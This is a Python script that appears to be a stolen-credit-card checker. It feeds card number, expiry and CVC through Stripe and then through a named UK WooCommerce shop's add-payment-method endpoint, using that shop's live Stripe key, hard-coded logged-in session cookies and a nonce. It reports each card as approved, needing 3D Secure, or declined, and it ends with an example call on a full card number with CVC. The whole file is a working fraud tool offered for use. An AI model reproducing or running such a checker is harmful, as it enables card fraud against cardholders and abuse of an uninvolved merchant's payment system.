import requests
import re
import time
import random

def au(ccx):
    ccx = ccx.strip()
    n, mm, yy, cvc = ccx.split("|")

    # ----------- STRIPE REQUEST ------------
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,de;q=0.6',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }

    data = f'billing_details[name]=+&billing_details[email]=ficada8620%40baxidy.com&billing_details[address][country]=YE&type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&payment_user_agent=stripe.js%2F93bc6d7bcf%3B+stripe-js-v3%2F93bc6d7bcf%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fjohnnysbackyard.co.uk&time_on_page=19291&client_attribution_metadata[client_session_id]=9a66b91a-d95e-47c0-b9c9-4f1b670f2579&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=36c1aa8b-3cc8-45c7-9b52-519006033c54&guid=8679103b-45ca-4667-8cb3-9e30fef2d54c7dc798&muid=06d318d0-c3a6-413d-94b6-4e891be1aa7b8c7f84&sid=bef04f2f-dc04-4c10-af00-408887d909d31da700&key=pk_live_51ETDmyFuiXB5oUVxaIafkGPnwuNcBxr1pXVhvLJ4BrWuiqfG6SldjatOGLQhuqXnDmgqwRA7tDoSFlbY4wFji7KR0079TvtxNs&_stripe_account=acct_1KQW8K2ENjnX48AP'

    try:
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        response_data = response.json()
    except Exception as e:
        return f"Stripe request failed: {e}"

    # Handle Stripe errors
    if isinstance(response_data, dict) and 'error' in response_data:
        error_code = response_data['error'].get('code', '')
        if error_code == 'incorrect_number':
            return "Card number invalid 404"
        elif error_code == 'invalid_expiry_year':
            return "Card expire invalid 909"
        else:
            return response_data['error'].get('message', 'Unknown Stripe error')
    else:
        id = response_data.get('id', 'No id found')
        print(f"Payment source created successfully. ID: {id}")

    # ----------- SITE REQUEST ------------
    cookies = {
        'wordpress_sec_770c706eea1236171dc55a3d679b65cf': 'ficada8620%7C1759938679%7CWnQYpRLAKr2NqG8o0ZFxX8mxx7l4BNxMMAIL6gA22AF%7C0f6b0d25ac8c58000d98327ce6d7f34d2499c1fe8cc952dbff79c97df4a9c23a',
        '__stripe_mid': '06d318d0-c3a6-413d-94b6-4e891be1aa7b8c7f84',
        'wordpress_logged_in_770c706eea1236171dc55a3d679b65cf': 'ficada8620%7C1759938679%7CWnQYpRLAKr2NqG8o0ZFxX8mxx7l4BNxMMAIL6gA22AF%7Cdad3d97bdf9a1a2ea2c1b4ce3fca86d8aee044b3bb5245efc3288b6793fb92bd',
        '__stripe_sid': '2b65d9d9-fcea-46ce-966d-16d92d60f63b37bd24',
    }

    headers_site = {
        'authority': 'johnnysbackyard.co.uk',
        'accept': '*/*',
        'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,de;q=0.6',
        'referer': 'https://johnnysbackyard.co.uk/my-account/add-payment-method/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }

    files = {
        'action': (None, 'create_setup_intent'),
        'wcpay-payment-method': (None, id),
        '_ajax_nonce': (None, 'a4e67c4c00'),
    }

    try:
        response_site = requests.post(
            'https://johnnysbackyard.co.uk/wp-admin/admin-ajax.php',
            cookies=cookies,
            headers=headers_site,
            files=files
        )
        data_site = response_site.json()
    except Exception as e:
        return f"Site request failed: {e}"

    # Safely extract nested data
    try:
        data_site = response_site.json()
    except ValueError:
        data_site = {}

# Ensure data_site is a dict
    if not isinstance(data_site, dict):
        data_site = {}

# Safely extract nested values
    main_data = data_site.get('data', {}) if isinstance(data_site, dict) else {}
    if not isinstance(main_data, dict):
        main_data = {}

    status = main_data.get('status', '')
    success = data_site.get('success', False) if isinstance(data_site, dict) else False
    error_obj = main_data.get('error') if isinstance(main_data, dict) else {}
    message = error_obj.get('message', '') if isinstance(error_obj, dict) else ''


    # Determine final status
    if success and status == 'succeeded':
        return "Approved"
    elif success and status == 'requires_action':
        return "3D Required"
    elif "declined" in message.lower():
        return "Card was Declined"
    elif message:
        return message
    else:
        return "Unknown error"

# Example usage
print(au("4895040585291392|10|27|511"))
